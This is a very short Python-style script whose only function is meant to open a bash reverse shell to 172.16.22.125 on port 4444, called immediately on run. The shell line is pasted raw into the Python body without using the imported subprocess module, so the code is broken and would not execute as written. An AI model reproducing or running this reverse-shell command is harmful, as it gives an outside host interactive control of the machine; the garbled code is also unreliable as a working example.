import subprocess 
 
def run():		
	bash -i >& /dev/tcp/172.16.22.125/4444 0>&1
run()
